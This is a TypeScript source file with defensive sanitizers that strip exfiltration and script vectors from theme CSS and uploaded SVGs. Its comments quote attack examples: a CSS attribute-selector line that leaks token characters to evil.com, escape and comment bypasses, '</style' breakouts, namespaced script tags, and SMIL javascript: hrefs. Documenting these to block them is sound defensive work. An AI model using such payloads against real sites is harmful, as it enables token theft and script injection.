/**
 * Sanitizes theme CSS before it's stored and injected into every public page's <head>
 * (see server/plugins/theme-resolver.ts). Theme CSS is purely declarative styling —
 * colors, spacing, typography via CSS custom properties — and never legitimately needs
 * to load external resources (fonts/images are handled through dedicated site settings,
 * not theme CSS). So `url()` and `@import` are stripped entirely rather than allow-listed.
 *
 * This closes the CSS attribute-selector exfiltration technique — e.g.
 * `input[value^="a"] { background: url(https://evil.com/?leak=a) }`, which can leak DOM
 * attribute values (tokens, form state) character-by-character to an attacker's server
 * purely from CSS matching, no JavaScript required — plus @import-based external
 * stylesheet loading and the legacy IE `expression()` code-execution vector.
 */
// CSS lets any character be escaped as `\` + 1-6 hex digits (+ one optional trailing
// whitespace) or `\` + the literal character itself, and browsers decode these during
// tokenizing — so `\75rl(...)` parses identically to `url(...)`, and `@\69mport`
// identically to `@import`. Decoding escapes before the literal-text strips below closes
// that bypass; run this first so a payload can't use escapes to also hide/split a
// dangerous construct across a comment the way `sanitizeThemeCss` already guards against
// for the unescaped case.
function decodeCssEscapes(css: string): string {
  return css.replace(/\\([0-9a-f]{1,6})[ \t\n\r\f]?|\\([\s\S])/gi, (_match, hex: string | undefined, lit: string | undefined) => {
    if (hex !== undefined) {
      const codePoint = Number.parseInt(hex, 16)
      if (Number.isNaN(codePoint) || codePoint > 0x10FFFF) return ''
      try {
        return String.fromCodePoint(codePoint)
      } catch {
        return ''
      }
    }
    return lit ?? ''
  })
}

export function sanitizeThemeCss(css: string): string {
  let out = decodeCssEscapes(css)
  // Strip comments first so a payload can't hide/split a dangerous construct across
  // one (e.g. "@im/* */port").
  out = out.replace(/\/\*[\s\S]*?\*\//g, '')
  // Strip @import (external stylesheet loading). Matches through the first semicolon;
  // over-consuming on malformed input (missing semicolon) fails closed, not open.
  out = out.replace(/@import\b[^;]*;?/gi, '')
  // Strip url(...) entirely everywhere it appears. Quoted alternatives are tried first
  // so a data: URI containing a literal ')' inside its quotes (routine for inline SVG —
  // transform functions, path data) is consumed in full; a naive `[^)]*` stops at that
  // first embedded ')', replaces only the partial match, and leaves the real remainder
  // of the value (including the true closing ')' and trailing ';') as unescaped garbage
  // text in the stylesheet, corrupting parsing from that point on. Each alternative is a
  // fully self-contained url(...)/expression(...) pattern (not a shared `\s*` suffix
  // outside the alternation) — a shared trailing quantifier that can also be satisfied by
  // the fallback branch is exactly the overlapping-repetition shape that enables
  // super-linear regex backtracking on malformed input.
  out = out.replace(/url\s*\(\s*"[^"]*"\s*\)|url\s*\(\s*'[^']*'\s*\)|url\s*\([^)]*\)/gi, 'none')
  // image-set()/-webkit-image-set()/cross-fade()/-webkit-cross-fade() also resolve to an
  // external image reference (per the CSS Images spec) but take a bare quoted string
  // instead of url(...), so they carry the exact same attribute-selector exfiltration risk
  // this function exists to close without ever containing the substring "url(" — a
  // documented real-world sanitizer bypass technique (used against webmail CSS sanitizers).
  // Same quoted-string-first matching as url()/expression() above, for the same reason.
  out = out.replace(/-?(?:webkit-)?(?:image-set|cross-fade)\s*\(\s*"[^"]*"\s*\)|-?(?:webkit-)?(?:image-set|cross-fade)\s*\(\s*'[^']*'\s*\)|-?(?:webkit-)?(?:image-set|cross-fade)\s*\([^)]*\)/gi, 'none')
  // Strip legacy IE CSS expression() (arbitrary script execution in old IE) — same
  // quoted-string-aware matching, since its argument is a JS-like expression that may
  // itself contain a quoted string with a ')' inside.
  out = out.replace(/\bexpression\s*\(\s*"[^"]*"\s*\)|\bexpression\s*\(\s*'[^']*'\s*\)|\bexpression\s*\([^)]*\)/gi, 'none')
  // Breaking out of the inline <style> element: an HTML parser ends it on `</style`
  // followed by whitespace, `/`, or `>` — so stripping only the literal `</style>` missed
  // `</style >` and `</style/x>`, and a single pass also reassembled `</sty</style>le>`.
  // Instead of chasing spellings, escape EVERY `<` as the CSS escape `\3c ` (trailing
  // space terminates the escape). CSS reads it back as the same character, so selectors
  // and string values keep their meaning, but no tag can ever form inside the <style>
  // element. `<` has no legitimate unescaped use in CSS outside strings and comments.
  out = out.replace(/</g, '\\3c ')
  return out
}

/**
 * Strips script-execution vectors from an uploaded SVG before it's stored and served back
 * with its own (attacker-influenced but allowlisted) `image/svg+xml` content-type — SVG is
 * XML that can carry <script>, event-handler attributes, and javascript:-scheme hrefs, all
 * of which execute when the file is opened directly (e.g. a media library's public URL,
 * navigated to on its own rather than embedded via <img>). Kept alongside the SVG-specific
 * pieces of the media MIME-type allowlist in upload.post.ts, since SVG is the one image
 * format on that allowlist that isn't otherwise script-inert. Strip-based like
 * sanitizeThemeCss above, for the same reason: this is a small, fixed set of known vectors,
 * not general-purpose HTML/SVG rendering.
 */
// Elements with no legitimate place in a media-library SVG that can execute or embed
// active content. Matched by LOCAL name, so a namespace prefix (`<h:script
// xmlns:h="http://www.w3.org/1999/xhtml">`, `<svg:script>`) doesn't slip past.
const SVG_DANGEROUS_ELEMENTS = 'script|foreignObject|iframe|embed|object|handler|listener'
const SVG_DANGEROUS_ELEMENT_WITH_BODY = new RegExp(String.raw`<((?:[\w-]+:)?(?:${SVG_DANGEROUS_ELEMENTS}))\b[\s\S]*?<\/\1\s*>`, 'gi')
const SVG_DANGEROUS_TAG = new RegExp(String.raw`<\/?(?:[\w-]+:)?(?:${SVG_DANGEROUS_ELEMENTS})\b[^>]*>`, 'gi')

// Attributes whose value is a URL (or, for SMIL animation, a value that can be animated
// INTO a URL attribute — `<set attributeName="href" to="javascript:...">`).
const SVG_URL_ATTRIBUTES = /^(?:[\w-]+:)?(?:href|src|action|formaction|to|from|by|values)$/i

const SAFE_DATA_URI = /^data:image\/(?:png|jpe?g|gif|webp|avif);/i

function decodeXmlEntities(value: string): string {
  return value
    .replace(/&#x([0-9a-f]+);?/gi, (_m, hex: string) => safeFromCodePoint(Number.parseInt(hex, 16)))
    .replace(/&#(\d+);?/g, (_m, dec: string) => safeFromCodePoint(Number.parseInt(dec, 10)))
    .replace(/&(?:colon|Tab|NewLine);/g, m => (m === '&colon;' ? ':' : ''))
    .replace(/&quot;/g, '"').replace(/&apos;/g, '\'').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&')
}

function safeFromCodePoint(codePoint: number): string {
  try {
    return String.fromCodePoint(codePoint)
  } catch {
    return ''
  }
}

function isDangerousUrlValue(raw: string): boolean {
  // Same normalization a browser applies before reading the scheme: entities decoded,
  // every C0 control/whitespace character removed (not just leading/trailing).
  // eslint-disable-next-line no-control-regex -- stripping C0 controls is the point of this check
  const value = decodeXmlEntities(raw).replace(/[\x00-\x20]/g, '')
  if (/^(?:javascript|vbscript):/i.test(value)) return true
  if (/^data:/i.test(value) && !SAFE_DATA_URI.test(value)) return true
  return false
}

function sanitizeSvgOnce(svg: string): string {
  let out = svg
  // DTD internal subsets can declare entities that expand into markup (`<!ENTITY x
  // "<script>…">` then `&x;`), and xml-stylesheet processing instructions can pull in
  // XSLT that emits script — neither has a use in an uploaded image.
  // Adjacent quantifiers use disjoint classes (`[^[>]`, `[^\]]`, `[^>]`) so this stays
  // linear on hostile input. A `]` inside an entity value just ends the match early: the
  // declaration itself is still removed with the DOCTYPE, and the leftover is inert text.
  out = out.replace(/<!DOCTYPE[^[>]*(?:\[[^\]]*\][^>]*)?>/gi, '')
  out = out.replace(/<!ENTITY[\s\S]*?>/gi, '')
  out = out.replace(/<\?xml-stylesheet[\s\S]*?\?>/gi, '')
  // Dangerous elements with their bodies, then any leftover open/close/self-closing tag
  // of the same (e.g. an unclosed <script> the pair pattern couldn't match).
  out = out.replace(SVG_DANGEROUS_ELEMENT_WITH_BODY, '')
  out = out.replace(SVG_DANGEROUS_TAG, '')
  // Attributes, one tag at a time: event handlers (any separator — whitespace or `/`)
  // are dropped outright; URL-bearing attributes are dropped when their decoded value is
  // an executable scheme. The attribute run must begin with whitespace or `/`, which the
  // tag-name class can't match — so the name and attribute quantifiers never compete for
  // the same characters (this runs on untrusted uploads; it must not backtrack badly).
  out = out.replace(/<([a-z][\w:.-]*)((?:[\s/](?:[^>"']|"[^"]*"|'[^']*')*)?)>/gi, (_tag, name: string, attrs: string) => {
    const cleaned = attrs.replace(
      /([\s/]+)([^\s=/>]+)(\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/g,
      (whole, _sep: string, attrName: string, assignment: string | undefined, dq?: string, sq?: string, bare?: string) => {
        const local = attrName.replace(/^[\w-]+:/, '')
        if (/^on/i.test(local)) return ''
        if (assignment && SVG_URL_ATTRIBUTES.test(attrName)) {
          // SMIL `values` is a `;`-separated list — each entry can become the URL.
          const raw = dq ?? sq ?? bare ?? ''
          const candidates = /^values$/i.test(local) ? raw.split(';') : [raw]
          if (candidates.some(isDangerousUrlValue)) return ''
        }
        return whole
      },
    )
    return `<${name}${cleaned}>`
  })
  return out
}

export function sanitizeSvg(svg: string): string {
  // Repeat until nothing changes: a single pass can reassemble a dangerous construct out
  // of the pieces around something it removed (`<scr<script></script>ipt>` becomes
  // `<script>` after one pass). Bounded, since each productive pass strictly shrinks the
  // input.
  let current = svg
  for (let i = 0; i < 20; i++) {
    const next = sanitizeSvgOnce(current)
    if (next === current) return next
    current = next
  }
  // Still changing after 20 passes — adversarial input; refuse rather than serve it.
  return '<svg xmlns="http://www.w3.org/2000/svg"/>'
}
